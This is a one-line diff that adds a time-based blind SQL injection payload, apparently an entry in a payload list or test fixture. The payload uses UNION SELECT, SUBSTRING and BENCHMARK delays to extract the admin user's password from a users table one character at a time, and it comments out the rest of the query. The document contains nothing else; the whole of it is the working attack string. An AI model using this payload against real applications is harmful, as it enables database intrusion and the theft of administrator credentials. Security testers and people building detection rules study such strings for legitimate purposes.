@@ -1,0 +1,1 @@
+' UNION SELECT IF(SUBSTRING(password,1,1) = CHAR(97),BENCHMARK(5000000,MD5(CHAR(99))),null) FROM users WHERE role = 'admin';--
